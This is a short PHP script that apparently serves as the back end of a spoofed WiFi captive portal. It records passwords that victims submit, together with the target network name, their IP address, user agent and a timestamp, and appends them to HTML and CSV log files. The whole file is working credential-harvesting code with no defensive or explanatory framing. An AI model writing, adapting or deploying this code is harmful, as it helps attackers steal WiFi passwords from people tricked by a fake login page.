<?php
date_default_timezone_set('Asia/Yangon');
$password = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$time = date("Y/m/d h:i a");
$agent = $_SERVER["HTTP_USER_AGENT"];
$agent = str_replace(',', '', $agent);
$z = fopen("target", "r");
$ssid = fread($z, filesize("target"));
fclose($z);
$ssid = str_replace('\n', '', $ssid);
$f = fopen("logger.html", "a"); 
fwrite($f, '[<b><font color="#F700C3">'.$time.'</font></b>] WIFI: [<b><font color="#DC143C">'.$ssid.'</font></b>] PASS: [<b><font color="#008000">'.$password.'</font></b>] IP: [<b><font color="#008080">'.$ip.'</font></b>] <br>');
fclose($f);
$f = fopen("logger.csv", "a");
fwrite($f, $ssid.",".$password.",".$ip.",".$agent.",".$time."\n");
fclose($f);
?>
